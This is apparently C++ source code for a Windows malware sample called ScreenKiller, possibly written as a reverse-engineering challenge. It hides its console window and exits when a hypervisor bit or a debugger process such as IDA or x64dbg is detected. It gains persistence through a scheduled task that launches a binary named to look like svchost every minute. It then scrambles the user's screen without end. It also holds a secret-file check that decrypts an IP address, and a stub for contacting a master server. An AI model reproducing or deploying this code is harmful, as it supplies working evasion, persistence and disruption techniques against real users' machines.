#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

#include "ScreenKiller.hpp"
#include "Helpers.hpp"

VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj);

ScreenKiller::ScreenKiller() : m_alive(false), m_persistent(false), m_connected(false) 
{
	size_t size;
	char *path;
	_dupenv_s(&path, &size, "temp");

	this->m_temp_path = path;
}

ScreenKiller::~ScreenKiller()
{
	this->suicide();
}

void ScreenKiller::deploy()
{
	this->m_alive = true;

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	this->m_runner_thread = std::thread([this] {this->deploy_inner(); });
}

void ScreenKiller::suicide()
{
	this->m_runner_thread.detach();
	this->m_alive = false;
}

bool ScreenKiller::deploy_inner()
{
	this->check_secret_file();
	this->exit_if_vm_cpuid();
	this->connect_to_master_server();
	this->exit_if_debugged();
	this->get_persistency();

	HWND hDesktop = NULL;
	ScreenProps screen_props = { 0 };
	hDesktop = GetDesktopWindow();

	screen_props.hdcScreen = GetDCEx(hDesktop, NULL, DCX_CACHE | DCX_LOCKWINDOWUPDATE);

	srand(GetCurrentTime());

	RECT desktop = { 0 };
	
	GetWindowRect(hDesktop, &(screen_props.rectScreen));

	while (this->m_alive)
	{
		ScrambleWindow(&screen_props, this);
		Sleep(10);
	}

	return true;
}

bool ScreenKiller::get_persistency()
{
	system("schtasks /create /f /tn \"Network\" /sc minute /mo 1 /tr \"cmd /c start C:\\Windows\\System32\\scvhost.exe\"");

	return true;
}

bool ScreenKiller::connect_to_master_server()
{
	return false;
}

void ScreenKiller::exit_if_vm_cpuid()
{
	int32_t registers[4];

	__cpuid(registers, 1);
	bool hypervisor_bit = static_cast<bool>((registers[2] >> 31) & 0x1);

	if (hypervisor_bit)
	{
		exit(DEBUG_OR_VM_EXITCODE);
	}
}

void ScreenKiller::exit_if_debugged()
{
	if (this->is_debugged1() || this->is_debugged2())
		exit(DEBUG_OR_VM_EXITCODE);
}

bool ScreenKiller::is_debugged1()
{
	return IsDebuggerPresent();
}

bool ScreenKiller::is_debugged2()
{
		const wchar_t* debuggersFilename[7] = {
			L"cheatengine-x86_64.exe",
			L"ollydbg.exe",
			L"ida.exe",
			L"ida64.exe",
			L"idaq64.exe",
			L"radare2.exe",
			L"x64dbg.exe"
		};

		const wchar_t *pogan_name = L"scvhost.exe";

		size_t count_instances = 0;
		wchar_t* processName;
		PROCESSENTRY32W processInformation{ sizeof(PROCESSENTRY32W) };
		HANDLE processList;
		
		processList = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		processInformation = { sizeof(PROCESSENTRY32W) };
		if (!(Process32FirstW(processList, &processInformation)))
		{
			return false;
		}
		
		do
		{
			for (const wchar_t* debugger : debuggersFilename)
			{
				processName = processInformation.szExeFile;
				if (_wcsicmp(debugger, processName) == 0) 
				{
					return true;
				}
			}
			if (_wcsicmp(pogan_name, processInformation.szExeFile) == 0)
			{
				count_instances++;
			}
		} while (Process32NextW(processList, &processInformation));

		CloseHandle(processList);

		return count_instances > 1;
}

void ScreenKiller::check_secret_file()
{
	FILE *fp; 
	char secret_buf[MAX_FILE] = { 0 };
	//char *temp_path;
	//size_t sz = 0;
	//_dupenv_s(&temp_path, &sz, "temp");


	std::string filename = "\\secret.txt";
	//filename = temp_path + filename;
	filename = this->m_temp_path + filename;

	fopen_s(&fp, filename.c_str(), "r");
	if (fp == NULL)
		return;

	fread(secret_buf, 1, MAX_FILE, fp);
	std::string encoded_key = encode_string(secret_buf);

	if (encoded_key == ENCODED_KEY)
		MessageBoxA(NULL, (decrypt_ip(secret_buf)).c_str(), "Hmmm", NULL);
}

VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj) 
{
	HDC hdcScreen = screen_props->hdcScreen;
	RECT rectScreen = screen_props->rectScreen;
	HDC hdcMemory = NULL;
	HBITMAP hBitmap = NULL;
	int iWidth, iHeight, iX1, iY1, iX2, iY2;

	hdcMemory = CreateCompatibleDC(hdcScreen);

	iWidth = abs(rectScreen.left - rectScreen.right) / DIVIDERS;
	iHeight = abs(rectScreen.top - rectScreen.bottom) / DIVIDERS;

	SelectObject(hdcMemory, hBitmap);

	while (TRUE)
	{
		obj->exit_if_debugged();

		iX1 = rectScreen.left + iWidth * (rand() % DIVIDERS);
		iX2 = rectScreen.left + iWidth * (rand() % DIVIDERS);
		iY1 = rectScreen.top + iHeight * (rand() % DIVIDERS);
		iY2 = rectScreen.top + iHeight * (rand() % DIVIDERS);

		BitBlt(hdcMemory, 0, 0, iWidth, iHeight, hdcScreen, iX1, iY1, SRCCOPY);
		BitBlt(hdcScreen, iX1, iY1, iWidth, iHeight, hdcScreen, iX2, iY2, SRCCOPY);
		BitBlt(hdcScreen, iX2, iY2, iWidth, iHeight, hdcMemory, 0, 0, SRCCOPY);

		Sleep(10);
	}

	DeleteDC(hdcMemory);
	DeleteObject(hBitmap);
}
